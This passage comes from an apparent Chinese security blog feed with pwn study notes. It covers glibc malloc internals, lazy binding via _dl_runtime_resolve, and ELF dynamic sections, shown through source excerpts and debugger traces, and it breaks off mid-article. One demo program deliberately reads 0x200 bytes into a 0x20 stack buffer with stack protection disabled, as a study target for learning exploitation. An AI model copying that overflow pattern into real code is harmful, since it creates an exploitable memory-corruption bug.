class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">       &#123;</span><br><span class="line">         bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">         <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">             (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">           &#123;</span><br><span class="line">             victim = victim-&gt;bk_nextsize;</span><br><span class="line">             <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                     (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">               victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                list does not have to be rerouted.  */</span></span><br><span class="line">             <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">               victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Exhaust */</span></span><br><span class="line">             <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">               &#123;</span><br><span class="line">                 set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                 <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                   victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="comment">/* Split */</span></span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                 <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                    have to perform a complete insert here.  */</span></span><br><span class="line">                 bck = unsorted_chunks (av);</span><br><span class="line">                 fwd = bck-&gt;fd;</span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                   &#123;</span><br><span class="line">                     errstr = <span class="string">"malloc(): corrupted unsorted chunks"</span>;</span><br><span class="line">                     <span class="keyword">goto</span> errout;</span><br><span class="line">                   &#125;</span><br><span class="line">                 remainder-&gt;bk = bck;</span><br><span class="line">                 remainder-&gt;fd = fwd;</span><br><span class="line">                 bck-&gt;fd = remainder;</span><br><span class="line">                 fwd-&gt;bk = remainder;</span><br><span class="line">                 <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                   &#123;</span><br><span class="line">                     remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                     remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                 set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                 set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                 set_foot (remainder, remainder_size);</span><br><span class="line">               &#125;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><h3 id="使用-Top-chunk"><a href="#使用-Top-chunk" class="headerlink" title="使用 Top chunk"></a>使用 Top chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line">      <span class="comment">// 如果 top chunk 大小足够大就从 top chunk 里面分配</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果 top chunk 的大小足够就直接切割分配，否则如果此时还有 fastbin 就触发 malloc_consolidate 重复上述流程，如果没有 fastbin 调用 sysmalloc 分配内存</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;文中未做说明 均是指 glibc 2.23&lt;/p&gt;
&lt;h2 id=&quot;简单源码分析&quot;&gt;&lt;a href=&quot;#简单源码分析&quot; class=&quot;hea
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn 知识图谱</title>
    <link href="https://nocbtm.github.io/2020/02/25/pwn-%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/"/>
    <id>https://nocbtm.github.io/2020/02/25/pwn-知识图谱/</id>
    <published>2020-02-25T04:56:05.000Z</published>
    <updated>2020-04-04T12:10:11.469Z</updated>
    
    <content type="html"><![CDATA[<p><img alt="pwn知识图谱.png" data-src="/imgs/pwn_knowledge_map.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img alt=&quot;pwn知识图谱.png&quot; data-src=&quot;/imgs/pwn_knowledge_map.png&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ret2_dl_runtime_resolve学习笔记</title>
    <link href="https://nocbtm.github.io/2020/02/24/ret2_dl_runtime_resolve/"/>
    <id>https://nocbtm.github.io/2020/02/24/ret2_dl_runtime_resolve/</id>
    <published>2020-02-24T10:11:46.000Z</published>
    <updated>2020-04-09T13:12:12.482Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<br><a href="https://www.freebuf.com/articles/system/170661.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/170661.html</a><br><a href="https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more" target="_blank" rel="noopener">https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more</a><br><a href="https://bbs.pediy.com/thread-227034.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-227034.htm</a><br><a href="https://bbs.pediy.com/thread-253833.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-253833.htm</a><br><a href="https://blog.csdn.net/conansonic/article/details/54634142" target="_blank" rel="noopener">https://blog.csdn.net/conansonic/article/details/54634142</a></p><h2 id="前置知识：函数执行流程"><a href="#前置知识：函数执行流程" class="headerlink" title="前置知识：函数执行流程"></a>前置知识：函数执行流程</h2><p>因为程序分为静态链接跟动态链接，因为好多库函数在程序中并不一定都用到，所以在处理动态链接程序的时候，elf文件会采取一种叫做延迟绑定（lazy binding）的技术，也就是当我们位于动态链接库的函数被调用的时候，编译器才会真正确定这个函数在进程中的位置,下面我们通过一个程序来展示这个过程。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc fun.c -fno-stack-protector -m32 -o fun</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,buffer,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fun();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以read函数为例，下断点到read@plt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b *0x80482e0</span></span><br><span class="line">Breakpoint 3 at 0x80482e0</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">►  0x80482e0  &lt;read@plt&gt;                  jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+12] &lt;0x804a00c&gt; </span><br><span class="line"> // 0x804a00c是read的got.plt表地址，里面存放着0x80482e6</span><br><span class="line">   0x80482e6  &lt;read@plt+6&gt;                push   0 // _dl_runtime_resolve第二个参数</span><br><span class="line">   0x80482eb  &lt;read@plt+11&gt;               jmp    0x80482d0</span><br><span class="line">    ↓</span><br><span class="line">   0x80482d0                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; // _dl_runtime_resolve第一个参数</span><br><span class="line">   0x80482d6                              jmp    dword ptr [0x804a008] &lt;0xf7fee000&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7fee000 &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">   0xf7fee001 &lt;_dl_runtime_resolve+1&gt;     push   ecx</span><br><span class="line">   0xf7fee002 &lt;_dl_runtime_resolve+2&gt;     push   edx</span><br><span class="line">   0xf7fee003 &lt;_dl_runtime_resolve+3&gt;     mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7fee007 &lt;_dl_runtime_resolve+7&gt;     mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7fee00b &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe77e0&gt; //执行完_dl_fixup后eax存放着glibc中read函数的地址</span><br><span class="line">   0xf7fee010 &lt;_dl_runtime_resolve+16&gt;    pop    edx</span><br><span class="line">   0xf7fee011 &lt;_dl_runtime_resolve+17&gt;    mov    ecx, dword ptr [esp]</span><br><span class="line">   0xf7fee014 &lt;_dl_runtime_resolve+20&gt;    mov    dword ptr [esp], eax  //把read函数地址存到esp</span><br><span class="line">   0xf7fee017 &lt;_dl_runtime_resolve+23&gt;    mov    eax, dword ptr [esp + 4]</span><br><span class="line">   0xf7fee01b &lt;_dl_runtime_resolve+27&gt;    ret    0xc //返回到 read函数</span><br><span class="line">   0xf7fee01e                             nop</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/4xw 0x804a00c</span></span><br><span class="line">0x804a00c:0x080482e60xf7df45400x000000000x00000000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4xw 0x804a004</span><br><span class="line">0x804a004:0xf7ffd9180xf7fee0000x080482e60xf7df4540</span><br></pre></td></tr></table></figure><p>通过上面一步一步调试，可以清楚看到函数执行流程，call read@plt –&gt;<a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a> –&gt;read@plt+6 –&gt;_dl_runtime_resolve(link_map,rel_offest) –&gt; _dl_fixup –&gt; ret _dl_runtime_resolve+16 –&gt; ret read<br>其中_dl_runtime_resolve函数的两个参数 link_map=0xf7ffd918,rel_offest=0，执行完_dl_runtime_resolve()函数后，就返回到了read函数。</p><p>但绑定的过程是在 _dl_fixup中实现的，接下通过_dl_fixup的源码分析一下函数绑定的实现<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> stack 6</span></span><br><span class="line">00:0000│ esp  0xffffcf04 —▸ 0xf7ffd918 ◂— 0x0</span><br><span class="line">01:0004│      0xffffcf08 ◂— 0x0</span><br><span class="line">02:0008│      0xffffcf0c —▸ 0x8048424 (fun+25) ◂— add    esp, 0x10</span><br><span class="line">03:000c│      0xffffcf10 ◂— 0x0</span><br><span class="line">04:0010│      0xffffcf14 —▸ 0xffffcf20 ◂— 0x8000</span><br><span class="line">05:0014│      0xffffcf18 ◂— 0x200</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xf7fee00b &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe77e0&gt;</span><br><span class="line">        arg[0]: 0xffffcf94 ◂— 0x0</span><br><span class="line">        arg[1]: 0xffffcf70 ◂— 0x1</span><br></pre></td></tr></table></figure><p>借用Veritas501大佬的图更直观的了解这个过程</p><p><img alt="" data-src="/imgs/ret2-dl-runtime-resolve-1.png" class="lozad"></p><h2 id="ELF关于动态链接的一些关键section"><a href="#ELF关于动态链接的一些关键section" class="headerlink" title="ELF关于动态链接的一些关键section"></a>ELF关于动态链接的一些关键section</h2><p>先熟悉一下几个动态链接的一些关键section，以便于分析源码</p><h3 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h3><p>包含了一些关于动态链接的关键信息，在这个fun上它长这样，事实上这个section所有程序都差不多</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08049F14 _DYNAMIC        Elf32_Dyn &lt;1, &lt;1&gt;&gt;      ; DATA XREF: LOAD:080480BC↑o</span><br><span class="line">LOAD:08049F14                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o</span><br><span class="line">LOAD:08049F14                                         ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:08049F1C                 Elf32_Dyn &lt;0Ch, &lt;80482A8h&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:08049F24                 Elf32_Dyn &lt;0Dh, &lt;80484B4h&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:08049F2C                 Elf32_Dyn &lt;19h, &lt;8049F08h&gt;&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:08049F34                 Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:08049F3C                 Elf32_Dyn &lt;1Ah, &lt;8049F0Ch&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:08049F44                 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:08049F4C                 Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049F54                 Elf32_Dyn &lt;5, &lt;804821Ch&gt;&gt; ; DT_STRTAB</span><br><span class="line">LOAD:08049F5C                 Elf32_Dyn &lt;6, &lt;80481CCh&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:08049F64                 Elf32_Dyn &lt;0Ah, &lt;4Ah&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:08049F6C                 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:08049F74                 Elf32_Dyn &lt;15h, &lt;0&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:08049F7C                 Elf32_Dyn &lt;3, &lt;804A000h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:08049F84                 Elf32_Dyn &lt;2, &lt;10h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:08049F8C                 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:08049F94                 Elf32_Dyn &lt;17h, &lt;8048298h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:08049F9C                 Elf32_Dyn &lt;11h, &lt;8048290h&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:08049FA4                 Elf32_Dyn &lt;12h, &lt;8&gt;&gt;    ; DT_RELSZ</span><br><span class="line">LOAD:08049FAC                 Elf32_Dyn &lt;13h, &lt;8&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:08049FB4                 Elf32_Dyn &lt;6FFFFFFEh, &lt;8048270h&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:08049FBC                 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049FC4                 Elf32_Dyn &lt;6FFFFFF0h, &lt;8048266h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:08049FCC                 Elf32_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure><p>这个section的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向.dynstr, .dynsym, .rel.plt这3个section的指针，可以readelf -S fun看一下各个段的地址，会发现这三个section的地址跟在ida所示的地址是一样的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">readelf -S fun</span><br><span class="line">共有 31 个节头，从偏移量 0x17f0 开始：</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000050 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804821c 00021c 00004a 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          08048266 000266 00000a 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         08048270 000270 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048290 000290 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048298 000298 000010 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        080482a8 0002a8 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080482d0 0002d0 000030 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        08048300 000300 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048310 000310 0001a2 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        080484b4 0004b4 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        080484c8 0004c8 000008 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        080484d0 0004d0 000034 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        08048504 000504 0000ec 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4  //dynamic</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000014 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a014 001014 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  1</span><br><span class="line">  [27] .comment          PROGBITS        00000000 00101c 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 0016e3 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001054 000460 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 0014b4 00022f 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><h3 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481CC ; ELF Symbol Table</span><br><span class="line">LOAD:080481CC                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481DC                 Elf32_Sym &lt;offset aRead - offset byte_804821C, 0, 0, 12h, 0, 0&gt; ; "read"</span><br><span class="line">LOAD:080481EC                 Elf32_Sym &lt;offset aGmonStart - offset byte_804821C, 0, 0, 20h, 0, 0&gt; ; "__gmon_start__"</span><br><span class="line">LOAD:080481FC                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804821C, 0, 0, 12h, 0, \ ; "__libc_start_main"</span><br><span class="line">LOAD:080481FC                            0&gt;</span><br><span class="line">LOAD:0804820C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804821C, \ ; "_IO_stdin_used"</span><br><span class="line">LOAD:0804820C                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br></pre></td></tr></table></figure><p>这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的puts。结构体定义如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  unsigned char st_info; //对于导入函数符号而言，它是0x12</span><br><span class="line">  unsigned char st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0</span><br></pre></td></tr></table></figure></p><h3 id="dynstr"><a href="#dynstr" class="headerlink" 